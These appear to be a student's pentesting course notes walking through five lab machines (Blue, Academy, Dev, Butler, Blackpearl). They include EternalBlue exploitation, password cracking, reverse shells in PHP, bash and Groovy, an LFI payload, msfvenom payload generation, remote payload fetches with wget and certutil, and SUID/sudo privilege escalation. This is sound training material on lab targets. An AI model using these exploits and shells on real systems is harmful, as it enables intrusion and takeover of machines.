Old Cap Playlist: https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB

Required Cap: https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH

# Observations

## Blue
**VM setup >> login and get IP**
`192.168.138.135`

Start with NMAP scan
```bash
nmap -p- -A -T4 192.168.138.135
```
**What is juicy:**
 - SMB 139, 445
 - OS information
 - SMB 445 version >> Win7 ultimate 7601 Service Pack 1
 - may need to use SMB enum tools if stuck
 - research in google >> eternal blue looks juicy for initial foothold

**Metasploit - automated method**
```shell
msfconsole
search eternalblue
use 1 #scan for RCE
options #check details
set rhosts 192.168.138.135
run #shows likely vuln

search eternalblue
use 3 #4 is win8, 5 is pshell -- 3 is easiest
options #check details
set rhosts 192.168.138.135
check #checks RHOST IP for vuln

#can set payload to 32 or 64 bit if you know the architecture of target
set payload windows/64x/meterpreter/reverse_tcp #can use auto-complete tab after windows > set meterpreter and reverse_tcp

options #check details > look at lhost this time
set lhost eth0 #put in attacker IP or interface
run #may not work right away, might need to run a few times
```

**Manual Method**
Start research in google for RCE
- eternalblue github >> look for best repos
	- https://github.com/3ndG4me/AutoBlue-MS17-010

**Setup in Kali**
```bash
cd /opt/
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git #code from github
cd AutoBlue-MS17-010/ #change to autoblue directory

#follow github for install instructions
pipinstall -r requirements.txt

#run checker to see vuln
run python eternal_checker.py <TARGET-IP> #if vuln: can take screenshot and use as evidence, especially if exploit will take down machine - get permission 1st
```

**Execution after setup**
```bash
#in autoblue directory -- refer to github if needed
cd shellcode/
`./shell_prep.sh`
[enter LHOST]
[enter LPORT] #heath used 9999 and 2222
[select 1] #for regular shell
[select 0] #for staged payload

cd.. #back to autoblue direcotry
listener_prep.sh #runs listener in metasploit
[insert LHOST] #can use netcat nc -nvlp 9999 [port listed]
[insert LPORT] #9999 2222
[select 1] #for regular shell
[select 0] #for staged payload

#run exploit in autoblue directory
python eternalblue_exploit7.py 192.168.138.135 shellcode/sc_all.bin

>>> #blue screened the maching / took machine down
```

## Academy
**VM Setup: urs/pass `root // tcm`**
- run `dhclient`
- get IP `ip a`
- 192.168.138.129

**Start NMAP**
```bash
nmap -p- -A -T4 192.168.138.129
```
- ftp 21 open > vsftpd 3.0.3
	- note.txt
- ssh 22 open >>> heath immediately erases 22 off the board (for CTFs, in real life can attempt brute force to test for weak passwds and client detection)
- http 80 open> apache httpd 2.4.38 > webserver
	- go look at it in browser for default webpage

Looking at FTP
```bash
ftp 192.168.138.129 #connect
#heath uses anonymous twice for user/pass to check if anonymous login is not disabled
ls #look for juicy
get note.txt #download file(s) from ftp
#can check if file is also stored on web server /note.txt, if so can execute on it 
exit

#back in local
cat note.txt #can see password hash
cd ~ #cd home
hash-identifier #use to get data on hash
[insert hash] #will give possible hashs

#use google: hashcat md5 hash
```

#### Hashcat
- runs off of GPUs, best to run on base OS to utilize graphics card
	- if run in VM, will use CPU (virtualized gpu) - will be a lot slower
```bash
locate rockyou.txt #gives path for file
gedit hashes.txt #copy and paste hash from ftp into .txt
#start hashcat: parameters = module 0 correlates to MD5, provide hash text file, provide wordlist to use
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
>>#cracked hash = student
```
- password = student

**Directories**
#### dirb
```bash
dirb [insert IP of webserver]
#will list out all directories and everything inside, may take a while
```

#### ffuf
```bash
apt install ffuf #install
ffuf -w /usr/share/wordlists/dirbuster/directory-list2.3-medium:FUZZ -u http://192.168.138.129/FUZZ #can autotab to select list, set fuzz parameter to target web server

#unlike dirb, only goes one level deep

```

go to newly discovered subdirectory in browser: `academy`
- `192.168.138.129/academy`
- copy registration number from ftp note
- copy password from cracked hash
- poke around to see all the webapp features, think how can we exploit any vulns based on what they are using
- see if file upload system has checks, view image to see where its being stored 
	- google php reverse shell >> https://github.com/pentestmonkey/php-reverse-shell
	- can copy raw >> create file in kali , shell.php
		- gedit, nano, or mousepad >> follow txt, need to change IP and port
	- set up listener on assigned port `nc -nvlp 1234`
	- upload shell.php file on webserver >> check listener for shell
		- `whoami` >> not admin
		- is sudo there: sudo -l, which sudo, locate sudo >> no
		- need to do privesc

#### linpeas - Linux Privesc
used for linux privesc checks
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Transfer Directory
- in kali, make `transfer` directory >> cd into it
	- create linpeas.sh file >> copy raw from github
- standup webserver
```bash
python3 -m http.server 80
```
Back to NC / listener
```bash
cd /tmp
pwd #to check
wget [your attacker IP]/linpeas.sh #loading linpeas script onto target webserver
ls #to check 
chmod +x linpeas.sh #making the script executable
./linpeas.sh #run script

#after finished, look for RED according to legend
```
- red and yellow **** looks juicy, copy it >> this looks like an interesting file to check
	- `/home/grimmie/back.sh`
- config files > config.php `/var/www/html/academy/includes/config.php`
- passwords > copy and paste relevant ones 
	- mysql
- `cat` the config.php file
	- can see user `grimmie`
	- can see pass `My_V3ryS3cur3_P4ss`
	- see its a sql db
- can cat /etc/passwd to check all users on machine
	- >>can see grimmie on list

Try out user `grimmie`
```bash
ssh grimmie@192.168.138.129 #ssh into webserver as user
#paste password 

sudo -l #heath always checks sudo, no sudo available
#remember interesting file: `/home/grimmie/back.sh`

cd /home/grimmie
ls
cat backup.sh #this looks like periodic backups of the server
```

if nothing is in cron `crontab -l` , `crontab -u root -l` , `crontab -e`
try `systemctl list-timer` to see if any scripts are running processes
to check validation that things are running timer, can use tool `pspy`
#### pspy
https://github.com/DominicBreuker/pspy
- download 64bit version >> may get placed in downloads folder, will need to move transfer directory to run from there
```bash
mv Downloads/pspy64 transfer/pspy64
```
Back in web server grimmie shell
```bash
cd /tmp
wget [your attacker IP]/pspy64 #putting pspy 64 onto webserver from transfer directory 
ls #check
chmod +x pspy64 #make executable
./pspy64 #run script
#will show all processes running on machine >>> can confirm that backup.sh is running

cd /home/grimmie/
#google bash reverse shell one liner >> will place this in backup.sh >> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
bash reverse shell one liner: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Back in kali
```bash
##open your txt editor, need to change script IP (to attacker IP) and port (optional)
nc -nvlp 8081 #set to assigned port in script
```
Back in grimmie
```bash
nano backup.sh
#delete lines (ctrl K)
#paste edited reverse shell one liner
#check back in kali nc/listener
```
Back in kali
```bash
observer nc listener
#after script runs, should spawn shell
whoami #>> root
cd /root #change to root directory
ls #list files
cat flag.txt #found the flag! 
```

## Dev
VM setup > get IP
Start Nmap scan
```bash
nmap -A -T4 -p- 192.168.138.137
```
- 22 ssh - eh
- 80 http - web server
- 111 - rpcbind , not as advantageous as a beginner
- 2049 - nfs: network file share, potentially mountable interest
- 8080 - http >> phpinfo : looks like info page
- mountd and nlockmgr >> meh, skip
**Looking at 80 and 8080 (http)**
- Check browser for webserver responses
	- can see that they are running Bolt 
- open kali > use ffuf to further enumerate
```bash
#doing 2 - one for each port
ffuf -w /usr/share/wordlists/dirbuster/directory-list2.3-medium:FUZZ -u http://192.168.138.137/FUZZ #for normal port 80

#open in another terminal
ffuf -w /usr/share/wordlists/dirbuster/directory-list2.3-medium:FUZZ -u http://192.168.138.137:8080/FUZZ #added port 8080
```
- multitask while ffuf is running >> can start looking at NFS
```bash
showmount -e 192.168.138.137 #shows path for any mounted fileshares for IP
#utilize to moun to, need directory
mkdir /mnt/dev
mount -t nfs 192.168.138.137:/srv/nfs /mnt/dev #mount from directory into nfs using info from above [path and IP] >> last parameter puts it in said directory

cd /mnt/dev/
ls # check files
unzip save.zip #need password
```
- try getting password with fcrackzip
```bash
#in another terminal

#trying with fcrackzip
apt install fcrackzip
#run fcrack: -v (verbose), -u (unzip), -D (dictionary attack), -p (specify file to attack)
fcrackzip -v -u -D -p /usr/share/ordlists/rockyou.txt save.zip
>> #PW = java101
```
- pass = java101 >> can try back in mount terminal
```bash
#in /mnt/dev/
ls #check
cat todo.txt #read for possible info >> spotted potential user: jp
#id_rsa file is a key, can be used to connect to ssh
ssh -i id_rsa jp@192.168.138.137 #fail > but note info for possiblilities
```
- check back on ffuf for info >> 	check new directories in browser
	- port 80
		- public, src, app
		- app has directories >> download yml config file with user/pass
			- bolt::I_love_java  >> save info in notes
	- port 8080
		- dev
			- >> shows bolt app page
- can check google for boltwire exploits or searchploit in kali
```bash
searchploit boltwire 
#XSS is not useful right now, only for attacking users - we are attacking box
>>#local file inclusion is listed > research this
```
- Local File Inclusion (LFI) boltwire: https://www.exploit-db.com/exploits/48411
	- Local file inclusion exploit (also known as LFI) is the process of including files that are already locally present on the server, through the exploitation of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included, and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP, and others.
- follow exploit instructions to try, need to create user then can paste in the query
```http
p=action.search&action=../../../../../../../etc/passwd
```
- boltwire app now shows /etc/passwd/ file: shows the USERS
	- scroll down to identify user: jeanpaul
- back to mount terminal now that we have the user name
```bash
#in /mnt/dev
#using the jeanpaul username to try ssh
ssh -i id_rsa jeanpaul@192.168.138.137 
#for password, we found the I_love_java pass in the yml config, can try it
ls #check
pwd #nothing here
history #heath always does history check
sudo -l #always check sudo -l to see what you can run as sudo without password >> can see that we can run zip
sudo zip #works, how can we abuse this feature to get root without password?

#look at google, gtfobins
```
- gtfobins : https://gtfobins.github.io/
	- >sudo escalation
	- >zip
	-  can paste in jeanpaul terminalm 
```bash
TF=$(mktemp -u) #copy paste first
sudo zip $TF /etc/hosts -T -TT 'sh #' #copy paste 2nd for shell
sudo rm $TF #may not need
```
- we have a shell not with sudo
```bash
id #check who are are
ls #check files
cat flag.txt #found flag
```

## Butler
VM setup > get IP
Start NMAP
```bash
nmap -T4 -p- -A 192.168.138.138
```
- 8080 - http >> check browser
	- found login page for jenkins
		-can google for jenkins attacks
		-can try directory busting
		-viewing source code for anything
		-can try app default passwords, find from google
	- we need something that gets us authentication
- 7680 - pando-pub?
	- can try connecting via telnet, we don't see this often
- we need to brute force jenkins, we will utilize burp suite
**Brute Force Jenkins**
- start foxyproxy > enable burp (must have it setup)
- launch burp > intercept
- fill and send jenkins user and pass fields
- in burp > send to repeater and intruder
	- in repeater > send request, can see remember-me cookie
	- in intruder > set positions
		- highlight username and password inputer to set parameters >> add each
		- when using multiple parameters we either use pitchfork or cluster bomb attack type
			- pitchfork - good for credential stuffing. 1 to 1
			- cluster bomb - going to try every single user with every single password in the list
		- >> we will use clusterbomb attack since we have no info on user/pass
		- try common users and passwords first for payload options
				- Users: `admin` , `administrator` , `jenkins`
				- Pass: `password` , `jenkins` , `Password` , `Jenkins` , `Password1`
- start attack >> observe for status changes 
	- spotted that jenkins / jenkins is valid login
**Log in with Jenkins / Jenkins**
- we now have ability to run code execution, we need to find where
- poke around in jenkins >> can see groovy script console
	- google jenkins reverse shell, exploiting groovy
		- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- copy and paste into groovy script console
	- set local host to attacker IP 
-  set up listener in kali with assigned port
```bash
nc -nvlp 8044
```
- run script in jenkins >> check back on listener, shell spawned
```bash
whoami #should be butler\butler
#now need to privesc
systeminfo #check system details
```
We will utilize WINPEAS 
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- download latest obfuscated release >> move into transfer folder (or where u want to host it)
```bash
#IN KALI
#after winpeas is downloaded and moved, start in transfer directory
#host the transfer directory
python3 -m http.server 80

```

```powershell
#in jenkins >> win box
dir #shows directories , look at any time changes and juicy files
cd \users\butler #cd back to home

certutil.exe -urlcache -f http://192.168.138.131/winpeas.exe winpeas.exe #grabbing winpeas and naming it

dir #to check
#run winpeas
winpeas.exe
#scroll through and look for juicy QUICK wins
```
- wisebootassistant looks very interesting , can modify all access? >> unquoted service path
	- we saw it in downloads as well
	- we can leverage wise.exe if we have write access to the wise folder
We now want to generate malware >> use msfvenom 
```bash
#in transfer directory
#manual, not through meterpreter
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.131 LPORT=7777 -f exe > wise.exe
#this generates our malware >> a reverse shell called wise.exe

#start transfer server again
python3 -m http.server 80
```
- open another terminal for listener session
```bash
ncat -nvlp 7777 #assign port from wise.exe malware
```
Back in Jenkins > we need to navigate to wise folder to place the malware, wise.exe
```powershell
cd c:\
dir #copy and paste where to move to
cd "Program Files (x86)"
cd Wise
dir #check , can see WiseCare 365
certutil -urlcache -f http://192.168.138.131/Wise.exe Wise.exe #transfer file over from kali, transfer server

#now how do we run Wise.exe? >> if we run it right away it will just run as user butler, we need it to run as system
#we need to STOP the service that is running and restart it
sc stop WiseBootAssistant #stops current service
sc query WiseBootAssistant #check if stopped

sc start WiseBootAssistant #runs shellcode as system, not user 
#check listener to see if it worked
```
Checking listener
```bash
#can see if shell spawned
whoami #nt authority\system
```

## Blackpearl
VM Setup > get IP
Start NMAP
```bash
nmap -T4 -A -p- 192.168.138.130
```
- 22 ssh - meh
- 80 http - webserver
- 53 dns - maybe if nothing on 80
Check 80 in browser >> can do directory busting >> can view source code for anything juicy
- >> see a domain email at end
start ffuf
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.158.138.130/FUZZ 
```
- found /secret >> check in browser, it's a file > save it
- open in txt editor
	- trolled
#### dnsrecon
```bash
dnsrecon -r 127.0.0.0/24 -n 192.168.138.130. -d [any text] # parameters: -r = our range, local host where machine is, -n target box IP, -d domain

#found DNS pointer record (PTR) -- blackpearl.tcm >>> we need to add this our DNS
nano /etc/host #edit host file >> add dns record for blackpearl.tcm using target IP
192.168.138.130  blackpearl.tcm
>>save
```
- reopen web browser >> visit new dns entry >> http://blackpearl.tcm
	- my info php page
- fuzz the new directory
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ #don't neeed IP, can use url
```
- navigate shows up >> check it in browser
	- can see navigate CMS >> search google for exploit
	- navigate cms exploit: using metasploit https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
Use metasploit
```bash
msfconsole
use exploit/multi/http/navigate_cms_rce #can copy from webpage instructions
options #check what to set
set rhosts 192.168.138.130
set vhost blackpearl.tcm #need to set virtual host as well
options #check if everything is set
run #execute exploit

#meterpreter shell spawns
shell
whoami #not admin/root
#we need to spawn a TTY shell
which python #check if python is installed
python -c 'import pty; pty.spawn("/bin/sh")'

#now we have the TTY shell
sudo -l #not found
history #nothing

#now we need to check for privesc >> we can navigate to /tmp to run things

cd /tmp
wget http://192.168.138.131/linpeas.sh linpeas.sh #prepping linpeas transfer
#go to kali terminal to setup linpeas in transfer directory
```
- spawning TTY shell with python: https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html
- back in kali
```bash
cd transfer
ls #check, make sure linpeas.sh is there
python3 -m http:.server 80 #start webserver for transfer directory
#go back to TTY shell to run
```
- back in TTY shell
```bash
#run wget command
chmod +x linpeas.sh #make linpeas executable
#run it
./linpeas.sh
```
- analyze linpeas results >> can start bottom up since top is system heavy info
	- interesting files section looks juicy
	- rws >>>> s = SUID , user ID
	- rwxr-s >>> s = SGUID, group ID
	- very interesting >> can look at permission settings 
- back in TTY shell - finding permission settings
```bash
#check perm settings
find / .type f -perm -4000 2>/dev/null 
#can see paths, there is a php7.3 binary

#can use gtfobins for SUID 
# we need to run the php ::: -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);" #executes bin.sh as the root user

#euid = root, can execute as root
cd /root
ls
cat flag.txt
#done
```
- goal was to cover virtual host routing
